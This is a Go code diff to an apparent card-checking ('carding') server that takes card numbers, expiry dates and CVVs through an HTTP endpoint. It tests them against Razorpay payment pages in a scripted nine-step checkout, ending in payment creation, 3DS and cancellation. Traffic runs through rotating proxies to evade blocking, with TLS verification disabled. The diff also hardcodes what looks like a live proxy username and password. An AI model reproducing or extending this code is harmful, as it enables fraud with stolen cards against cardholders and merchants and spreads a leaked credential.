@@ -39,7 +39,11 @@ var (
     proxyIndex uint64
 )
 
-// ============ PROXY FORMATTING WITH BRIGHTDATA SUPPORT ============
+// ============ HARDCODED PROXY - CHANGE THIS ============
+// Your BrightData proxy in host:port:username:password format
+const HARDCODED_PROXY = "brd.superproxy.io:44445:brd-customer-hl_811cf298-zone-datacenter_proxy2:yhqq9su8bgxx"
+
+// ============ PROXY FORMATTING ============
 
 func generateSessionID() string {
     const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
@@ -62,7 +66,7 @@ func formatProxy(raw string) string {
         return raw
     }
     
-    // Handle BrightData format: host:port:username:password
+    // Handle format: host:port:username:password
     parts := strings.Split(raw, ":")
     if len(parts) >= 4 {
         host := parts[0]
@@ -94,46 +98,29 @@ func formatProxy(raw string) string {
     return "http://" + raw
 }
 
-// ============ BRIGHTDATA PROXY VALIDATION ============
+// ============ GET PROXY - PRIORITIZES HARDCODED PROXY ============
 
-func isBrightDataProxy(proxyURL string) bool {
-    return strings.Contains(proxyURL, "brd.superproxy.io") || 
-           strings.Contains(proxyURL, "brightdata.com") ||
-           strings.Contains(proxyURL, "brd-customer")
-}
-
-func enhanceBrightDataProxy(proxyURL string) string {
-    if !isBrightDataProxy(proxyURL) {
-        return proxyURL
+func getProxy() string {
+    // FIRST: Use hardcoded proxy
+    if HARDCODED_PROXY != "" {
+        formatted := formatProxy(HARDCODED_PROXY)
+        if formatted != "" {
+            log.Printf("🔧 Using hardcoded proxy: %s", maskProxy(formatted, "LIVE"))
+            return formatted
+        }
     }
     
-    // Parse the proxy URL
-    parsed, err := url.Parse(proxyURL)
-    if err != nil {
-        return proxyURL
+    // SECOND: Try to load from px.txt
+    proxyList := loadProxies("px.txt")
+    if len(proxyList) > 0 {
+        idx := atomic.AddUint64(&proxyIndex, 1) - 1
+        proxy := proxyList[idx%uint64(len(proxyList))]
+        log.Printf("🔧 Using proxy from px.txt: %s", maskProxy(proxy, "LIVE"))
+        return proxy
     }
     
-    username := parsed.User.Username()
-    password, _ := parsed.User.Password()
-    
-    // Add session if not present
-    if !strings.Contains(username, "-session-") {
-        sessionID := generateSessionID()
-        username = username + "-session-" + sessionID
-    }
-    
-    // Add country targeting if not present
-    if !strings.Contains(username, "-country-") {
-        username = username + "-country-us"
-    }
-    
-    // Rebuild URL
-    return fmt.Sprintf("%s://%s:%s@%s", parsed.Scheme, username, password, parsed.Host)
-}
-
-func getNextURL() string {
-    idx := atomic.AddUint64(&urlIndex, 1) - 1
-    return razorpayURLs[idx%uint64(len(razorpayURLs))]
+    log.Printf("⚠️ No proxy available, using direct connection")
+    return ""
 }
 
 func loadProxies(filepath string) []string {
@@ -145,7 +132,11 @@ func loadProxies(filepath string) []string {
     lines := strings.Split(string(data), "\n")
     for _, line := range lines {
         line = strings.TrimSpace(line)
-        if line == "" {
+        if line == "" || strings.HasPrefix(line, "#") {
+            continue
+        }
+        // Skip if it's a comment
+        if strings.HasPrefix(line, "//") {
             continue
         }
         formatted := formatProxy(line)
@@ -156,19 +147,9 @@ func loadProxies(filepath string) []string {
     return proxies
 }
 
-func getNextProxy(proxyList []string) string {
-    if len(proxyList) == 0 {
-        return ""
-    }
-    idx := atomic.AddUint64(&proxyIndex, 1) - 1
-    proxy := proxyList[idx%uint64(len(proxyList))]
-    
-    // Enhance BrightData proxy with session and country
-    if isBrightDataProxy(proxy) {
-        proxy = enhanceBrightDataProxy(proxy)
-    }
-    
-    return proxy
+func getNextURL() string {
+    idx := atomic.AddUint64(&urlIndex, 1) - 1
+    return razorpayURLs[idx%uint64(len(razorpayURLs))]
 }
 
 // ============ UTILITY FUNCTIONS ============
@@ -334,11 +315,11 @@ func NewCustomFetch(proxyURL, ua string) (*CustomFetch, error) {
     }
 
     transport := &http.Transport{
-        TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
-        MaxIdleConns:        20,
-        IdleConnTimeout:     60 * time.Second,
-        DisableCompression:  false,
-        DisableKeepAlives:   false,
+        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+        MaxIdleConns:    20,
+        IdleConnTimeout: 60 * time.Second,
+        DisableCompression: false,
+        DisableKeepAlives:  false,
         MaxIdleConnsPerHost: 10,
         ResponseHeaderTimeout: 30 * time.Second,
     }
@@ -350,6 +331,8 @@ func NewCustomFetch(proxyURL, ua string) (*CustomFetch, error) {
         }
         transport.Proxy = http.ProxyURL(parsed)
         log.Printf("🔧 Using proxy: %s", maskProxy(proxyURL, "LIVE"))
+    } else {
+        log.Printf("⚠️ No proxy - using direct connection")
     }
 
     client := &http.Client{
@@ -480,9 +463,11 @@ func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
     rzpDeviceID, fhash := generateRzpDeviceID()
     rzpSessionID := generateRzpSessionID()
 
-    // Enhance BrightData proxy with session and country
-    if isBrightDataProxy(proxyURL) {
-        proxyURL = enhanceBrightDataProxy(proxyURL)
+    // Log proxy being used
+    if proxyURL != "" {
+        log.Printf("🌐 Checking card with proxy: %s", maskProxy(proxyURL, "LIVE"))
+    } else {
+        log.Printf("⚠️ Checking card with DIRECT connection (no proxy)")
     }
 
     fetch, err := NewCustomFetch(proxyURL, ua)
@@ -492,6 +477,7 @@ func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
     defer fetch.client.CloseIdleConnections()
 
     // Step 1: Get payment page
+    log.Printf("📡 Step 1: Fetching payment page: %s", targetURL)
     r1, err := fetch.Get(targetURL, map[string]string{
         "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
         "Accept-Language": "en-US,en;q=0.5",
@@ -506,6 +492,7 @@ func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
         log.Printf("⚠️ 403 Forbidden on %s - proxy may be blocked", targetURL)
         return CheckResult{Status: "error", Message: "403 Forbidden - Proxy blocked by Razorpay", Proxy: proxyURL, ProxyStatus: "DEAD"}
     }
+    log.Printf("✅ Page fetched: Status %d", r1.StatusCode)
 
     jsonStr := extractJSONVar(r1Text, "data")
     if jsonStr == "" {
@@ -559,6 +546,7 @@ func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
     keylessHeaderURL := url.QueryEscape(keylessHeader)
 
     // Step 2: Create order
+    log.Printf("📡 Step 2: Creating order...")
     r2Payload := map[string]interface{}{
         "notes":      map[string]string{"comment": "", "name": "User"},
         "line_items": []map[string]interface{}{{"payment_page_item_id": ppid, "amount": forceAmount}},
@@ -595,6 +583,7 @@ func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
         }
         return CheckResult{Status: "error", Message: errMsg, Proxy: proxyURL, ProxyStatus: "LIVE"}
     }
+    log.Printf("✅ Order created: %s", orderID)
 
     checkoutID := orderID
     if idx := strings.Index(orderID, "_"); idx != -1 {
@@ -611,6 +600,7 @@ func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
     }
 
     // Step 3: Get session token
+    log.Printf("📡 Step 3: Getting session token...")
     params3 := url.Values{
         "traffic_env":        {"production"},
         "build":              {BUILD},
@@ -651,6 +641,7 @@ func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
     if sessid == "" {
         return CheckResult{Status: "error", Message: "Session token not found", Proxy: proxyURL, ProxyStatus: "LIVE"}
     }
+    log.Printf("✅ Session token obtained")
 
     rzpRef := fmt.Sprintf("https://api.razorpay.com/v1/checkout/public?traffic_env=production&build=%s&build_v1=%s&checkout_v2=1&new_session=1&unified_session_id=%s&session_token=%s",
         BUILD, BUILD_V1, rzpSessionID, sessid)
@@ -665,6 +656,7 @@ func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
     }
 
     // Step 4: Preferences
+    log.Printf("📡 Step 4: Setting preferences...")
     {
         resources := []string{"checkout_version_config", "merchant", "merchant_features", "downtime", "customer", "customer_tokens", "truecaller", "methods", "experiments", "offers", "checkout_config", "order", "invoice", "buyer_protection", "personalization"}
         queryArr := make([]map[string]string, 0, len(resources))
@@ -700,6 +692,7 @@ func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
     }
 
     // Step 5: Checkout order
+    log.Printf("📡 Step 5: Checkout order...")
     {
         form5 := url.Values{
             "notes[email]":          {email},
@@ -741,6 +734,7 @@ func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
     }
 
     // Step 6: CB flows
+    log.Printf("📡 Step 6: CB flows...")
     {
         r6Payload := map[string]interface{}{
             "identifiers": map[string]interface{}{
@@ -765,6 +759,7 @@ func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
     }
 
     // Step 7: Create payment
+    log.Printf("🔥 Step 7: Creating payment...")
     tokenCreate := base64.StdEncoding.EncodeToString([]byte(`[{"name":"sardine","metadata":{"session_id":"` + checkoutID + `"}}]`))
 
     form7 := url.Values{
@@ -851,8 +846,10 @@ func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
         }
         return CheckResult{Status: "declined", Message: label, Proxy: proxyURL, ProxyStatus: "LIVE"}
     }
+    log.Printf("✅ Payment created: %s", paymentID)
 
     // Step 8: 3DS Authentication
+    log.Printf("📡 Step 8: 3DS Authentication...")
     pidClean := paymentID
     if idx := strings.Index(paymentID, "_"); idx != -1 {
         pidClean = paymentID[idx+1:]
@@ -893,6 +890,7 @@ func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
     }
 
     // Step 9: Final result
+    log.Printf("📡 Step 9: Getting final result...")
     r9, err := fetch.Get(
         fmt.Sprintf("https://api.razorpay.com/v1/standard_checkout/payments/%s/cancel?key_id=%s&session_token=%s&keyless_header=%s", paymentID, kyid, sessid, keylessHeader),
         map[string]string{
@@ -1144,6 +1142,19 @@ func logResult(card *ParsedCard, result CheckResult, proxyDisplay, targetURL str
 func handler(w http.ResponseWriter, r *http.Request) {
     w.Header().Set("Content-Type", "application/json")
 
+    // Get proxy from URL parameter or use hardcoded
+    proxyParam := r.URL.Query().Get("proxy")
+    var proxyURL string
+    
+    if proxyParam != "" {
+        // Use proxy from URL parameter
+        proxyURL = formatProxy(proxyParam)
+        log.Printf("📌 Using proxy from URL parameter: %s", maskProxy(proxyURL, "LIVE"))
+    } else {
+        // Use hardcoded proxy
+        proxyURL = getProxy()
+    }
+
     path := r.URL.Path
     re := regexp.MustCompile(`^/razorpay/cc=(.+)$`)
     match := re.FindStringSubmatch(path)
@@ -1153,7 +1164,7 @@ func handler(w http.ResponseWriter, r *http.Request) {
         json.NewEncoder(w).Encode(map[string]string{
             "status":   "error",
             "response": "Invalid endpoint. Use: /razorpay/cc={cc|mm|yy|cvv}",
-            "proxy":    "N/A",
+            "proxy":    maskProxy(proxyURL, "N/A"),
         })
         return
     }
@@ -1165,16 +1176,21 @@ func handler(w http.ResponseWriter, r *http.Request) {
         json.NewEncoder(w).Encode(map[string]string{
             "status":   "error",
             "response": "Invalid card format. Use: cc|mm|yy|cvv",
-            "proxy":    "N/A",
+            "proxy":    maskProxy(proxyURL, "N/A"),
         })
         return
     }
 
-    proxyList := loadProxies("px.txt")
-    proxy := getNextProxy(proxyList)
     targetURL := getNextURL()
 
-    result := checkCard(card.CC, card.MM, card.YY, card.CVV, proxy, targetURL)
+    // Log what we're using
+    if proxyURL != "" {
+        log.Printf("🌐 Processing card with proxy: %s", maskProxy(proxyURL, "LIVE"))
+    } else {
+        log.Printf("⚠️ Processing card with DIRECT connection (no proxy)")
+    }
+
+    result := checkCard(card.CC, card.MM, card.YY, card.CVV, proxyURL, targetURL)
 
     proxyDisplay := maskProxy(result.Proxy, result.ProxyStatus)
     logLive(card, result)
@@ -1207,7 +1223,7 @@ func main() {
     log.Printf("  Listening on: http://%s", addr)
     log.Printf("  Endpoint: /razorpay/cc={cc|mm|yy|cvv}")
     log.Printf("=========================================================")
-    log.Printf("  ✅ BrightData proxy support added")
+    log.Printf("  ✅ Hardcoded proxy: %s", HARDCODED_PROXY)
     log.Printf("  ✅ Session persistence enabled")
     log.Printf("  ✅ Country targeting (US)")
     log.Printf("  ✅ 403 error handling")
